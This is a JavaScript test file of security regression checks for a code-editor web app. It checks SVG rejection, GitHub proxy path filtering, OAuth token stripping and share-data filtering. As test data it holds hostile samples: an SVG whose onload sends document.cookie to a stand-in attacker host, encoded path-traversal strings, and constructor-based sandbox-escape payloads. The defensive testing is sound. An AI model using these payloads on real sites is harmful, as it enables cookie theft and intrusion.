import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { safeRasterImage } from "../lib/dcode/secure-image.ts";
import { approvedGithubPath, approvedGithubQuery } from "../lib/dcode/github-proxy.ts";
import { publicSharePayload } from "../lib/dcode/share-response.ts";
import { supabaseSessionTokens } from "../lib/supabase/oauth-session.ts";

const read = (path) => readFile(new URL(`../${path}`, import.meta.url), "utf8");

test("OG image allowlist rejects active SVG and accepts verified raster signatures", () => {
  const malicious = `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.invalid/?c='+document.cookie)"><script>alert(1)</script><image href="https://attacker.invalid/pixel"/></svg>`;
  const svg = `data:image/svg+xml;base64,${Buffer.from(malicious).toString("base64")}`;
  assert.equal(safeRasterImage(svg, "preview.svg"), null);
  assert.equal(safeRasterImage(svg, "preview.png"), null);

  const pngBytes = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/fS8AAAAASUVORK5CYII=", "base64");
  const png = `data:image/png;base64,${pngBytes.toString("base64")}`;
  assert.equal(safeRasterImage(png, "preview.png")?.mime, "image/png");
  const jpeg = `data:image/jpeg;base64,${Buffer.from([0xff, 0xd8, 0xff, 0xd9]).toString("base64")}`;
  const gif = `data:image/gif;base64,${Buffer.from("GIF89a").toString("base64")}`;
  const webp = `data:image/webp;base64,${Buffer.from("RIFFxxxxWEBP").toString("base64")}`;
  assert.equal(safeRasterImage(jpeg, "preview.jpeg")?.mime, "image/jpeg");
  assert.equal(safeRasterImage(gif, "preview.gif")?.mime, "image/gif");
  assert.equal(safeRasterImage(webp, "preview.webp")?.mime, "image/webp");
  assert.equal(safeRasterImage(png, "preview.jpg"), null);
  assert.equal(safeRasterImage("data:image/png;base64,PHN2Zz4=", "preview.png"), null);
  assert.equal(safeRasterImage("data:image/avif;base64,AAAA", "preview.avif"), null);
});

test("OG route sets nosniff/CSP and rejects SVG before returning a response", async () => {
  const source = await read("app/d-code/share/[share_slug]/og-image/route.ts");
  assert.ok(source.includes(String.raw`if (!item || /\.svg$/i.test(item.name)) return notFound();`));
  assert.match(source, /X-Content-Type-Options.*nosniff/s);
  assert.match(source, /Content-Security-Policy.*default-src 'none'; sandbox/s);
  assert.doesNotMatch(source, /image\/svg\+xml/);
});

test("GitHub proxy accepts only approved operations and rejects traversal variants", () => {
  assert.ok(approvedGithubPath("GET", "repos/octocat/Hello-World"));
  assert.ok(approvedGithubPath("GET", "repos/octocat/Hello-World/git/trees/main"));
  assert.ok(approvedGithubPath("GET", "user/repos"));
  assert.equal(approvedGithubPath("POST", "user/repos"), null);
  for (const variant of [
    "repos/..%2f..%2fgists",
    "repos/%2e%2e/%2e%2e/gists",
    "repos/%252e%252e/%252e%252e/gists",
    "repos/octocat%2f..%2fgists",
    "repos/octocat\\..\\gists",
    "repos/%ZZ/repo",
    "repos/octocat/../gists",
    "user/repos/../../gists",
  ]) {
    assert.equal(approvedGithubPath("GET", variant), null, variant);
  }
  const query = approvedGithubQuery("user/repos", new URLSearchParams("sort=updated&per_page=30&affiliation=owner%2Ccollaborator"));
  assert.equal(query?.sort, "updated");
  assert.equal(approvedGithubQuery("user/repos", new URLSearchParams("url=https://evil.invalid")), null);
  assert.equal(approvedGithubQuery("user/repos", new URLSearchParams("page=1&page=2")), null);
  assert.equal(approvedGithubQuery("repos/o/r/commits", new URLSearchParams("sha=feature%2Fsafe"))?.sha, "feature/safe");
  assert.equal(approvedGithubQuery("repos/o/r/commits", new URLSearchParams("sha=../../gists")), null);
});

test("OAuth callback persists only Supabase tokens; middleware strips older provider tokens", async () => {
  const oauth = supabaseSessionTokens({ access_token: "supabase-access", refresh_token: "supabase-refresh", provider_token: "secret-provider-token", provider_refresh_token: "secret-refresh" });
  assert.deepEqual(Object.keys(oauth).sort(), ["access_token", "refresh_token"]);
  assert.equal(JSON.stringify(oauth).includes("secret-provider-token"), false);
  const callback = await read("app/auth/callback/route.ts");
  const middleware = await read("lib/supabase/middleware.ts");
  assert.match(callback, /setSession\(\s*supabaseSessionTokens\(data\.session\)/);
  assert.match(middleware, /session\?\.provider_token \|\| session\?\.provider_refresh_token/);
  assert.match(middleware, /supabase\.auth\.setSession\(supabaseSessionTokens\(session\)\)/);
});

test("GitHub browser import uses same-origin proxy and contains no provider token", async () => {
  const workspace = await read("components/dcode/DCodeWorkspace.tsx");
  const sourceControl = await read("lib/dcode/github.ts");
  const proxy = await read("app/api/github/[...path]/route.ts");
  assert.match(workspace, /\/api\/github\//);
  assert.doesNotMatch(workspace, /provider_token|https:\/\/api\.github\.com|raw\.githubusercontent\.com/);
  const sourceControlCode = sourceControl.replace(/\/\*[\s\S]*?\*\//g, "");
  assert.doesNotMatch(sourceControlCode, /provider_token|https:\/\/api\.github\.com/);
  assert.match(proxy, /https:\/\/api\.github\.com/);
  assert.doesNotMatch(proxy, /providerToken|Authorization:/);
  assert.match(proxy, /Cache-Control/);
  assert.match(proxy, /public repository GETs remain anonymous\/read-only/);
  assert.match(proxy, /request\.method !== "GET"/);
});

test("terminal has no JavaScript execution primitives and reports unavailable commands", async () => {
  const terminal = await read("components/dcode/DCodeTerminal.tsx");
  const payloads = [
    "globalThis.__terminalPwned = true",
    "({}).constructor.constructor('return window')()",
    "({}).constructor.constructor('return document.cookie')()",
    "localStorage.setItem('pwned', '1')",
  ];
  assert.doesNotMatch(terminal, /new Function|\beval\s*\(|AsyncFunction|runInThisContext/);
  assert.match(terminal, /unavailable\("node"\)/);
  assert.match(terminal, /unavailable\("npm"\)/);
  assert.match(terminal, /Simulated project-file status/);
  assert.match(terminal, /case "ls"|case "cat"|case "open"|case "pwd"/);
  for (const payload of payloads) assert.equal(terminal.includes(payload), false);
});

test("project workspace reads and every owner mutation are explicitly owner-scoped", async () => {
  const store = await read("lib/dcode.ts");
  const page = await read("app/d-code/(workspace)/[id]/page.tsx");
  assert.match(store, /\.eq\("id", id\)\s*\.eq\("user_id", user\.id\)/);
  assert.match(store, /\.delete\(\)[\s\S]*?\.eq\("user_id", user\.id\)/);
  assert.match(store, /\.update\([\s\S]*?\.eq\("user_id", user\.id\)/);
  assert.match(page, /getProject\(id\)/);
  assert.match(store, /if \(authError \|\| !user\) return null/);
});

test("public-share resolver is slug-only, public-filtered, and omits owner/internal columns", async () => {
  const route = await read("app/api/share/[key]/route.ts");
  const page = await read("app/d-code/share/[share_slug]/page.tsx");
  const migration = await read("supabase/migrations/20261031000000_harden_dcode_public_reads.sql");
  assert.match(route, /\^\[a-z0-9\]\{12\}\$/i);
  assert.equal((route.match(/\.eq\("is_public", true\)/g) ?? []).length, 2);
  assert.match(route, /title, description, language, files, is_public, share_slug/);
  assert.doesNotMatch(route, /user_id|select\("\*"\)/);
  assert.match(page, /getProjectByShareSlug\(shareSlug\)/);
  assert.match(page, /DCodeWorkspace project=\{state\.project\} readOnly/);
  assert.match(migration, /revoke all on table public\.dcode_projects from anon/i);
  assert.match(migration, /drop policy if exists "dcode_projects_select_public"/i);
  const dto = publicSharePayload({
    user_id: "private-owner-id", github_repo_full_name: "private/repo", id: "private-id",
    title: "Shared", description: null, language: "typescript", is_public: true, share_slug: "abcdefgh2345",
    files: [{ id: "file-1", name: "index.ts", language: "typescript", content: "export {}", private_metadata: "omit" }],
  });
  assert.deepEqual(Object.keys(dto).sort(), ["description", "files", "is_public", "language", "share_slug", "title"]);
  assert.deepEqual(Object.keys(dto.files[0]).sort(), ["content", "id", "language", "name"]);
  assert.equal(JSON.stringify(dto).includes("private-owner-id"), false);
  assert.equal(JSON.stringify(dto).includes("private/repo"), false);
});
